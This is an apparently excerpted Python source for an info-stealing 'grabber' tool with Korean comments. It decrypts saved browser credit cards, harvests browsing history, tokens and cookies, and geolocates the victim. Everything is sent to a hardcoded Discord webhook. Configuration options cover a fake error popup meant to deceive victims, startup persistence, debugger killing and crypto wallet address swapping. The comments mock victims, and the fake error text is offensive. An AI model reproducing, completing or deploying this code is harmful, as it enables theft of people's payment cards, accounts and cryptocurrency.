...
__config__ = { # 그래버 기본 세팅
    'yourwebhookurl': "https://discord.com/api/webhooks/1157850373139222608/4a3K2NkCMyEUkYS5Joa6vIEBq17rAD1ZsYfD_UKpkaYYbgHhS7cgFLSja9xMKGWIvxHA",
    'hide': 'no', # 콘솔 숨김여부 yes/no
    'ping': 'no', # 감염시 에브핑
    'pingtype': 'everyone', # 알지?
    'fake_error':'yes', # 가짜 에러(더 잘 속일수있노)
    'startup': 'no', # 시작프로그램
    'kill_discord_process': False, # 디코 강종
    'dbugkiller': False, # 디버거 강종

    'addresse_crypto_replacer': 'no', # 코인 지갑주소 복붙 바꿔치기
    'addresse_btc': 'none',
    'addresse_eth': 'none',
...
class bc_initial_func(Functions):
    ...
    def error_remote(self: str) -> str:
        if self.fake_error == "yes":
            ctypes.windll.user32.MessageBoxW(None, '에러 코드: Windows_0xFUCK00\n노무현이 부엉이바위위에서 운지했어요.', '치명적 오류', 0) # ctypes 말고 딴거 쓸걸 그랬나..?
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['whatever_is_here'] = "https://ANDYREAL.xyz"
        ...
        with open(os.path.join(self.dir, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                ...
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"이름: {name_on_card}   만료일 :  {expiration_year}/{expiration_month}   카드 번호: {self.dcrpt_val(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
    ...
    def steal_history(self):
        ...
        def xtractwbhist(db_cursor):
            ...
            for item in db_cursor.fetchall():
                web += f"검색 제목: {item[0]}\nURL: {item[1]}\n마지막 방문 시간: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
            return web
...
ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
    ...
    def finished_bc(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("ANDYREAL | https://ANDYREAL.xyz\n\n")
        ...
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{file_count}개의 파일 찾음: "

        embed = {
            'name': "ANDYREAL",
            'avatar_url': 'https://media.discordapp.net/attachments/1151489823056593006/1153661097455394879/image.png',
            'embeds': [
                {
                    'author': {
                        'name': f'ANDYREAL Grabber v2.3',
                        'url': 'https://ANDYREAL.xyz',
                        'icon_url': 'https://media.discordapp.net/attachments/1151489823056593006/1153661097455394879/image.png'
                    },
                    'color': 374276,
                    'description': f'[감염자 위치 땀 ㅋㅋㅋㅋㅋㅋㅋㅋ]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
        ...
        try:
            if methode == 'POST':
                if data != '':
                    ...
                    if r.status_code == 200 or r.status_code == 413: # 413 = 데이터 큼
                        return r
        except:
            pass
    ...
    if name == "bc_checking":
        ...
        "embeds": [
            ...
            "author": {
                'name': f'ANDYREAL Grabber v2.3',
                'url': 'https://ANDYREAL.xyz',
                'icon_url': 'https://cdn.discordapp.com/attachments/1151489823056593006/1153661097455394879/image.png'
            },
            "footer": {
                "text": "ANDYREAL.xyz"
            },
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1151489823056593006/1153661097455394879/image.png",
        "attachments": []
        }
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"ANDYREAL | https://ANDYREAL.xyz\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
...
def grabb_GatherAll():
    '                   Default Path < 0 >                         프로세스명 < 1 >        토큰  < 2 >                  비번 < 3 >       쿠키 < 4 >                          확장 < 5 >                                  '
    browserPaths = [
